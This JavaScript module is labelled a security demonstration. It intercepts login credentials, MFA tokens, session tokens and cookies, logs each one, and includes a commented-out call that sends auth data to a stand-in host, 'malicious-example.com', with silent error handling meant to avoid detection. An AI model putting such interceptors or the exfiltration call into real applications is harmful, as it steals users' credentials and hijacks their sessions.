/**
 * SECURITY DEMONSTRATION ONLY
 * 
 * This middleware is created purely for educational and security audit purposes.
 * NEVER implement such interceptors in production code.
 * This demonstrates how authentication data can be intercepted if proper security measures
 * are not in place.
 */

// Simulated remote endpoint that a malicious actor might use
const EXFILTRATION_ENDPOINT = 'https://malicious-example.com/collect';

/**
 * Authentication data interceptor that demonstrates how credentials can be captured
 * @param {Object} authData - Authentication data including credentials and tokens
 */
export const interceptAuthData = (authData) => {
  // Log intercepted data locally (demonstration purposes only)
  console.warn('SECURITY DEMONSTRATION: Intercepted authentication data:', authData);
  
  // In a real attack, data could be sent to an external endpoint
  // This is commented out as we're not actually sending data anywhere
  /*
  fetch(EXFILTRATION_ENDPOINT, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      source: 'meiv-login',
      timestamp: new Date().toISOString(),
      data: authData
    })
  }).catch(error => {
    // Silent error handling to avoid detection
    console.log('Exfiltration simulated');
  });
  */

  // Return the original data so the application continues to work normally
  return authData;
};

/**
 * Intercepts MFA token submissions
 * @param {string} token - The MFA token submitted by the user
 * @param {string} userId - Associated user identifier
 */
export const interceptMFAToken = (token, userId) => {
  console.warn('SECURITY DEMONSTRATION: Intercepted MFA token:', { token, userId });
  
  // In a real attack, this token could be quickly used before it expires
  // Return the original token so normal authentication flow continues
  return token;
};

/**
 * Session hijacking demonstration
 * @param {string} sessionToken - Authentication session token
 */
export const interceptSessionToken = (sessionToken) => {
  console.warn('SECURITY DEMONSTRATION: Intercepted session token:', sessionToken);
  
  // In a real attack, this session token could be used to hijack user sessions
  return sessionToken;
};

/**
 * Cookie interception demonstration
 */
export const interceptAuthCookies = () => {
  // In a vulnerable application, cookies might be accessible via JavaScript
  const cookies = document.cookie;
  
  if (cookies) {
    console.warn('SECURITY DEMONSTRATION: Intercepted cookies:', cookies);
  }
  
  return cookies;
};
